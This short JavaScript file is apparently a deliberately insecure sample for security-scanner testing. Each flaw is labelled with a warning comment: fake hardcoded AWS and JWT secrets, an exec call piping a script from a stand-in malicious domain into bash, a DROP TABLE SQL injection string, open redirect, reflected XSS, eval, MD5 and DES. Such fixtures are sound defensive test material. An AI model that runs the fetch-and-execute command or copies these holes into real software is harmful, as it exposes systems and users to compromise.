// 🚨 Hardcoded AWS credentials
const AWS_ACCESS_KEY = "AKIA1234567890FAKE";
const AWS_SECRET_KEY = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYFAKEKEY";

// 🚨 Exposed JWT secret
const jwtSecret = "super_secret_do_not_share";

// 🚨 Dangerous shell command
const { exec } = require('child_process');
exec("curl -sSL http://malicious-domain.com/install.sh | bash");

// 🚨 Use of deprecated crypto algorithm
const crypto = require('crypto');
const hash = crypto.createHash('md5').update('p@ssword123').digest('hex');

// 🚨 Vulnerable dependency usage
const _ = require('lodash'); // If version is old

// 🚨 Open redirect
const express = require('express');
const app = express();
app.get('/redirect', (req, res) => {
  const target = req.query.url;
  res.redirect(target); // ⚠️ No validation
});

// 🚨 SQL Injection
const userInput = "'; DROP TABLE users; --";
const query = `SELECT * FROM accounts WHERE username = '${userInput}'`;

// 🚨 XSS Vulnerability
app.get('/search', (req, res) => {
  const term = req.query.q;
  res.send(`<div>${term}</div>`); // ⚠️ Unsanitized output
});

// 🚨 Dangerous eval
eval("console.log('You should not eval this')");

// 🚨 Use of weak cipher
const weakCipher = crypto.createCipher('des', 'key');

